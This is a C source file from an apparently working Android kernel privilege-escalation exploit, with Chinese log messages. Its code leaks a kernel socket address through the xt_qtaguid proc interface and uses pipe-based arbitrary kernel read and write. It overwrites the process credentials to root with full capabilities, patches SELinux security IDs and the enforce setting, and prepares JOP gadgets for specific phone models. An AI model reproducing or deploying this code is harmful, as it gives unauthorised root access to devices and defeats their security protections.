#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <linux/socket.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <string.h>


#include "threadinfo.h"
#include "sid.h"
#include "log.h"
#include "getroot.h"

#include "DArray.h"
#include "common.h"


#define __user
#define __kernel

#define QUOTE(str) #str
#define TOSTR(str) QUOTE(str)
#define ASMMAGIC (0xBEEFDEAD)

#define PROC_VER    "/proc/version"
#define MAX_VER_LEN 512

int socket_fd_exploit = 0;

extern struct cred *(*my_get_task_cred) (struct task_struct *task);

static unsigned long int get_sock_address(){
    char buff[1024];
    struct sockaddr_in sock_addr;
    pid_t pid;
    int ctrlFd;
    uid_t uid;
    int len;
    void* mmap_addr0;
    int ret;
    unsigned long result;
    char* ptr, *ptr_start;

    socket_fd_exploit = socket(PF_INET/*2*/, SOCK_DGRAM/*2*/, IPPROTO_IP/*1*/);// = 14

    if (socket_fd_exploit < 0) {
    	ERROR("创建套接字失败. \n");
    	return 0;
    }

    memset(&sock_addr, 0, sizeof(sock_addr));
    sock_addr.sin_family = AF_INET;/*2*/
    sock_addr.sin_port = 0;
    sock_addr.sin_addr.s_addr = 0;
    ret = connect(socket_fd_exploit, (struct sockaddr*)&sock_addr, sizeof(sock_addr));
    if(-1 == ret){
        ERROR("创建连接失败, 返回值: %d \n", ret);
        return 0;
    }

    pid = getpid();// = 0x1352 = 4946
    snprintf(buff, 0x100, "/proc/%d/net/xt_qtaguid/ctrl", pid); ///proc/4946/net/xt_qtaguid/ctrl

    ctrlFd = open(buff, O_RDWR/*2*/);
    if(-1 == ctrlFd){
        ERROR("打开文件失败, 返回值: %d\n ", ctrlFd); //=0xF=15
        return 0;
    }

    uid = getuid(); //=0x7d0=2000
    snprintf(buff, 0x100, "d %lu %u", (long unsigned int)0, uid);
    len = strlen(buff);
    write(ctrlFd, buff, len);

    uid = getuid();
    snprintf(buff, 0x100, "t %d %llu %u", socket_fd_exploit, 0x133700000000LL, uid); // t 14 21126944129024 2000
    len = strlen(buff);
    write(ctrlFd, buff, len);

    mmap_addr0 = (void*)mmap(NULL, 0x11000/*0x11000*/, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);//=0xB6EF8008

    if (mmap_addr0 == MAP_FAILED) {
            ERROR("获取socket地址映射失败. \n");
            return 0;
    }

    /*
    sock=eaea5f80 tag=0x1337000007d0 (uid=2000) pid=4946 f_count=2\n
     events: sockets_tagged=46 sockets_untagged=44 counter_set_changes=16 delete_cmds=3
     iface_events=184 match_calls=3067399 match_calls_prepost=1227137 match_found_sk=1227047
     match_found_sk_in_ct=613116 match_found_no_sk_in_ct=99 match_no_sk=173395 match_no_sk_file=466\n
    */
    ret = read(ctrlFd, mmap_addr0, 0x00010000);
    if(-1 == ret){
        ERROR("文件读取错误, 返回值: %d \n", ret);
        return 0;
    }
    *((char*)mmap_addr0+ret) = 0;
    // LOGD("[+] <get_sock_address> read=%s", (char*)mmap_addr0);

    ptr = strstr((char*)mmap_addr0, "sock=");
    if(NULL == ptr){
        ERROR("查找套接字信息失败. \n");
        return 0;
    }
    ptr_start = ptr = ptr+strlen("sock=");
    while( *ptr != '\0' && *ptr != ' ' && *ptr != '\t' && ptr-ptr_start<=10){
        ptr++;
        continue;
    }
    *ptr = '\0';
    result = strtoul(ptr_start, NULL, 16);

    TRACE("套接字结构体地址: %p \n", (void*)result);
    uid = getuid();
    snprintf(buff, 0x100, "d %lu %u", (long unsigned int)0, uid);//=d 0 2000
    len = strlen(buff);

    write(ctrlFd, buff, 0);
    munmap(mmap_addr0, 0x11000);
    close(ctrlFd);

    return result;
}

static int get_kernel_version(char *buf)
{
    int fd;
    int ret = -1;

    fd = open(PROC_VER, O_RDONLY);
    if (fd < 0)
	return -1;

    if (read(fd, buf, MAX_VER_LEN) < 0) {
	   ERROR("去读内核版本数据错误. \n");
	   goto error;
    }
    ret = 0;
error:
    close(fd);
    return ret;
}

unsigned long get_target_addr(int offset)
{
    unsigned long addr;
    char kv[MAX_VER_LEN];
    int default_offset = 32;

    addr = get_sock_address();

    if (addr == 0)
    	return 0;

    /* 传入 offset */
    if (offset != 0) {
	   goto out2;
    }

    if (get_kernel_version(kv) < 0) {
	   ERROR("读取内核版本错误. \n");
	   goto out1;
    }

    if (strstr(kv, "Linux version 3.10")){
    	//printf("[+] version 3.10\n");
    	offset = 32;
    	goto out2;
    }
    else if (strstr(kv, "Linux version 3.4")){
    	//printf("[+] version 3.4\n");
    	offset = 28;
    	goto out2;
        }
    else if (strstr(kv, "Linux version 3.0")){
    	//printf("[+] version 3.0\n");
    	offset = 28;
    	goto out2;
        }

out1:
    /* 默认 offset */
    offset = default_offset;

out2:
    TRACE("获得目标地址偏移: %d \n", offset);
    return (addr + offset);
}

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes)) {
		return 1;
        }

	if (write(pipes[1], address, len) != len) {
            ERROR("读管道错误. \n");
            goto end;
        }

	if(read(pipes[0], buf, len) != len) {
		goto end;
        }
        //TRACE("读管道成功\n");

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes)) {
		return 1;
        }
	if(write(pipes[1], buf, len) != len) {
		goto end;
        }
	if(read(pipes[0], address, len) != len) {
		goto end;
        }
	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

inline int writel_at_address_pipe(void* address, unsigned long val)
{
	return write_at_address_pipe(address, &val, sizeof(val));
}

int modify_cred_security_uc(struct cred *cred, int sid)
{
        int ret = 1;

        if (sid < 0) {
                return 0;
        }

	struct task_security_struct* __kernel security = NULL;

	read_at_address_pipe(&cred->security, &security, sizeof(security));

	if ((unsigned long)security > KERNEL_START)
	{
		struct task_security_struct tss;
		if(read_at_address_pipe((unsigned char*)security , &tss, sizeof(tss))) {
                        ERROR("读取security失败. \n");
                        goto end;
                }

		if (tss.osid != 0
			&& tss.sid != 0
			&& tss.exec_sid == 0
			&& tss.create_sid == 0
			&& tss.keycreate_sid == 0
			&& tss.sockcreate_sid == 0)
		{
                        write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
                        write_at_address_pipe(&security->sid, &sid, sizeof(security->sid));
		}
	}
        ret = 0;
end:
        return ret;    
}

int modify_task_cred_uc(struct thread_info* __kernel info, int sid, unsigned long *cred_addr)
{
	unsigned int i;

	unsigned long val;        
	struct cred* __kernel cred = NULL;
	struct thread_info ti;
	struct task_struct_partial* __user tsp;

	if(read_at_address_pipe(info, &ti, sizeof(ti))) {
                ERROR("读取thread_info失败. \n");
                return 1;
        }

	tsp = malloc(sizeof(*tsp));
	for(i = 0; i < 0x600; i+= sizeof(void*))
	{
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)((void*)ti.task + i);
		if(read_at_address_pipe(t, tsp, sizeof(*tsp)))
			break;

		if (is_cpu_timer_valid(&tsp->cpu_timers[0])
			&& is_cpu_timer_valid(&tsp->cpu_timers[1])
			&& is_cpu_timer_valid(&tsp->cpu_timers[2])
			&& tsp->real_cred == tsp->cred)
		{
			cred = tsp->cred;
			break;
		}
	}

	free(tsp);
	if(cred == NULL) {
                ERROR("找不到cred的地址. \n");
                return 1;
        }

        /* output cred addr */
        *cred_addr = (unsigned long)cred;

	val = 0;
	write_at_address_pipe(&cred->uid, &val, sizeof(cred->uid));
	write_at_address_pipe(&cred->gid, &val, sizeof(cred->gid));
	write_at_address_pipe(&cred->suid, &val, sizeof(cred->suid));
	write_at_address_pipe(&cred->sgid, &val, sizeof(cred->sgid));
	write_at_address_pipe(&cred->euid, &val, sizeof(cred->euid));
	write_at_address_pipe(&cred->egid, &val, sizeof(cred->egid));
	write_at_address_pipe(&cred->fsuid, &val, sizeof(cred->fsuid));
	write_at_address_pipe(&cred->fsgid, &val, sizeof(cred->fsgid));

	val = -1;
	write_at_address_pipe(&cred->cap_inheritable.cap[0], &val, sizeof(cred->cap_inheritable.cap[0]));
	write_at_address_pipe(&cred->cap_inheritable.cap[1], &val, sizeof(cred->cap_inheritable.cap[1]));
	write_at_address_pipe(&cred->cap_permitted.cap[0], &val, sizeof(cred->cap_permitted.cap[0]));
	write_at_address_pipe(&cred->cap_permitted.cap[1], &val, sizeof(cred->cap_permitted.cap[1]));
	write_at_address_pipe(&cred->cap_effective.cap[0], &val, sizeof(cred->cap_effective.cap[0]));
	write_at_address_pipe(&cred->cap_effective.cap[1], &val, sizeof(cred->cap_effective.cap[1]));
	write_at_address_pipe(&cred->cap_bset.cap[0], &val, sizeof(cred->cap_bset.cap[0]));
	write_at_address_pipe(&cred->cap_bset.cap[1], &val, sizeof(cred->cap_bset.cap[1]));

	return modify_cred_security_uc(cred, sid);
}


int change_context(const char *context)
{
        int fd;
        int ret = -1;

        fd = open("/proc/self/attr/current", O_RDWR);

        if (fd < 0) {
                printf("can not open attr/current!\n");
                return -1;
        }

        if (write(fd, context, strlen(context) + 1) < strlen(context) + 1) {
                printf("write attr/current error!\n");
                goto out;
        }
        ret = 0;
out:
        close(fd);
        return ret;
}

int set_enforce(int value)
{
        int fd, ret;
        char path[PATH_MAX];
        char buf[8];

        snprintf(path, sizeof path, "/sys/fs/selinux/enforce");
        fd = open(path, O_RDWR);
        if (fd < 0)
                return -1;

        snprintf(buf, sizeof buf, "%d", value);
        ret = write(fd, buf, strlen(buf));
        close(fd);
        if (ret < 0)
                return -1;

        return 0;
}

int get_enforce()
{
        int fd, ret;
        char val;
        char path[PATH_MAX];

        snprintf(path, sizeof path, "/sys/fs/selinux/enforce");
        fd = open(path, O_RDONLY);
        if (fd < 0)
                return -1;

        ret = read(fd, &val, sizeof val);
        close(fd);
        if (ret < 0)
                return -1;

        return val - '0';
}

int get_context(char *buf)
{
        int fd, ret;
        char path[PATH_MAX];

        snprintf(path, sizeof path, "/proc/self/attr/current");
        fd = open(path, O_RDONLY);
        if (fd < 0)
                return -1;

        ret = read(fd, buf, MAX_CONTEXT);
        close(fd);
        if (ret < 0)
                return -1;
        return 0;
}


#if !(__LP64__)

struct thread_info* patch_addrlimit()
{
	struct thread_info* ti = current_thread_info();
        if ((unsigned long)ti  > KERNEL_START) {
                ti->addr_limit = -1;
                return ti;
        }
	return NULL;
}

#else

void preparejop(void** addr, void* jopret)
{
	unsigned int i;
	for(i = 0; i < (0x1000 / sizeof(int)); i++)
		((int*)addr)[i] = 0xDEAD;

/*
load frame pointer into x0, x0 is mmap address
LOAD:FFFFFFC0003C66E0                 LDR             X1, [X0,#0x210]
LOAD:FFFFFFC0003C66E4                 CBZ             X1, loc_FFFFFFC0003C66F0
LOAD:FFFFFFC0003C66E8                 ADD             X0, X29, #0x78
LOAD:FFFFFFC0003C66EC                 BLR             X1
*/
	addr[66] = jopret; //[X0, #0x210]

/* Xperia M5
.text:FFFFFFC0001E06FC                 LDR             X1, [X0,#8]
.text:FFFFFFC0001E0700                 CBZ             X1, loc_FFFFFFC0001E070C
.text:FFFFFFC0001E0704                 ADD             X0, X29, #0x10
.text:FFFFFFC0001E0708                 BLR             X1
*/
	addr[1] = jopret; //[X0,#8]

/* LG Nexus 5X
0xffffffc0003ee4f0      011040f9       ldr x1, [x0, 0x20]
0xffffffc0003ee4f4      a0430191       add x0, x29, 0x50
0xffffffc0003ee4f8      20003fd6       blr x1
*/
	addr[4] = jopret; //[x0, 0x20]
}

#endif
